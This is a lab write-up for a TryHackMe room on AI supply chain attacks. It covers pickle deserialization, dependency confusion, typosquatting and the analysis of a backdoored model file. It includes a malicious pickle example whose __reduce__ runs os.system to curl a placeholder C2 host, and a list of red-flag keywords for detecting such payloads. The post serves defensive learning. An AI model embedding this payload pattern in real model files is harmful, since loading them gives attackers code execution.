---
title: Supply Chain Attack Vectors
date: 2026-10-30 00:00:00 +0100
categories: [AI Security]
tags: [ai security, ai supply chain, attack vectors, pickle, model threats]
series: ""
series_order: 
---

> **Disclaimer**: This post contains my personal notes and methodology for the respective TryHackMe room. All the credits for the room and the lab environment go to the original creators at TryHackMe. **Flags are not revealed** to preserve the challenge for others. 
{: .prompt-info}

## Objective


> Learn how trusted ML components can be turned into attack vectors.

> Your security team has been called in. You will investigate four major attack vectors: malicious model serialisation (pickle), dependency confusion, model repository manipulation, and API provider compromise. Starting with a suspicious model file on the lab VM, you will trace how attackers exploit every layer of the AI supply chain.

---

## Serialization and Deserialization Mechanisms

Serialization converts object states into storable or transmittable formats. Frameworks like **PyTorch** and **scikit-learn** use serialization formats (such as pickle) to persist trained models.

### Python Pickle Vulnerabilities

The Python `pickle` module executes arbitrary code during reconstruction.

* **__reduce__ Vulnerability**: The `__reduce__` method defines how an object is reconstructed by returning a callable and arguments. An attacker can construct payloads that execute arbitrary system commands via `os.system` or `subprocess`.
* **Severity**: **Critical**. Deserializing untrusted pickle data leads directly to Remote Code Execution (RCE).

### Sample code utlizing python pickle

```python
import pickle

# Serialise (save) a model to a file
model = {"weights": [1.5, 2.3, 4.1], "bias": 0.5}
with open("model.pkl", "wb") as f:
    pickle.dump(model, f)

# Deserialise (load) the model back
with open("model.pkl", "rb") as f:
    loaded_model = pickle.load(f)
```

### Where the vulnerability lies in the pickle module

```python
import pickle
import os

class MaliciousModel:
    def __reduce__(self):
        # pickle.load() will call os.system() with this command
        return (os.system, ("curl hxxp://c2[.]example[.]com/beacon",))

with open("backdoored_model.pkl", "wb") as f:
    pickle.dump(MaliciousModel(), f)
```

---

## Investigating Malicious Model

> `code_reviewer.pkl` is compromised. 

![Image]({{ "assets/img/attackvectors_1.png" | relative_url}})

> Note the size difference between `code_reviewer.pkl` and `code_reviewer_v1.pkl`. 
{: .prompt-warning}

> Python has a built-in module named `pickletools` that can disassemble pickle files without executing them. Very handy!
{: .prompt-info}

```bash
python3 -m pickletools /opt/supply-chain/models/code_reviewer.pkl 2>&1 | head -30
```



![Image]({{ "assets/img/attackvectors_2.png" | relative_url}})

> Never use `pickle.load()` on untrusted files. It will execute any embedded code **immediately**. 
{: .prompt-danger}


The following should be considered as red flags if they show up when inspecting pickle files through pickletools: **os, system, popen, subprocess, socket, eval, exec, curl, wget, STACK_GLOBAL, REDUCE**. 

Now, running the same on `code_reviewer_v1.pkl`,

```bash
python3 -m pickletools /opt/supply-chain/models/code_reviewer_v1.pkl 2>&1 | head -30
```

 we get: 

![Image]({{ "assets/img/attackvectors_3.png" | relative_url}})

which seems to benign, and does not contain any remote commands to `attacker.com`

---

## Malicious Architecture and Model-Level Threats

Malicious logic can be embedded directly into model architectures.

* **Inference-Time Execution**: Embedded code or layers execute automatically when the model runs inference.
* **Keras Lambda Layers**: `tf.keras.layers.Lambda` allows execution of arbitrary Python expressions within the model graph, representing a **Medium severity** vector for executing unauthorized logic at inference time.

---

## Dependency Vectors: `pip` and Package Repositories

Package management introduces significant software supply chain risks.

### Package Manager Vulnerabilities (`pip`)
* **Dependency Confusion**: Publishing public packages matching internal repository names to intercept installations.
* **Typosquatting**: Registering names resembling popular libraries to exploit user typos.
* **Compromised Repositories**: Compromising maintainer credentials to inject malicious updates into legitimate packages.

#### Typosquatting example and mitigation

![Image]({{ "assets/img/attackvectors_4.png" | relative_url}})

You would run a command like `pip-audit` on a suspicious requirments file. This would check if the listed packages are listed offically on PyPI. If not, you will receive errors. 

![Image]({{ "assets/img/attackvectors_5.png" | relative_url}})


### Suspicious Indicators
* Unexplained version spikes without changelogs.
* Obfuscated installation scripts (`setup.py`).
* Unexpected network calls during package installation.

---

## Model Repositories, Silent Updates, and Infrastructure

* **Model Hub Threats**: Typosquatting and malicious weight files hosted on public model registries.
* **Silent Model Updates**: Dynamic fetching of unpinned models risks introducing unvetted architecture modifications.
* **AI API Compromise**: Enforce strict version pinning for API deployments.
* **API Key Management**: Store API keys in dedicated secrets managers and rotate them regularly.

---

## Prompt Template Injection & Training Data Poisoning

* **Prompt Template Injection**: Externalized prompt templates act as supply chain artifacts. **Treat system prompts as code**.
* **Upstream Training Data Poisoning**: Mitigation for opaque training pipelines involves rigorous red-teaming of model outputs against known malicious inputs to detect failures.

---

## The attack timeline

1. Attacker registers fake "trustworthy-ai-lab" organisation on Hugging Face and uploads a backdoored model with a pickle payload. Simultaneously publishes `internal-ml-utils==99.0.0` to PyPI to intercept TryTrainMe's internal package name.
2. TryTrainMe engineer downloads the model as a replacement for the code review pipeline. `pickle.load()` fires silently on first load; a C2 beacon connects to an eternal domain.
3. A routine `pip install -r requirements.txt` pulls the attacker's PyPI package. A second foothold is established independently of the model file.
4. SOC automated alert flags repeated outbound HTTPS connections to an unrecognised domain. The CEO receives the email.

> Even if one vector fails, another may succeed. That's why supply chain attacks are effective. There are many independent paths to code execution. In large projects, hundreds if not thousands. Securing each and every one is not feasible. 
{: .prompt-danger}

---
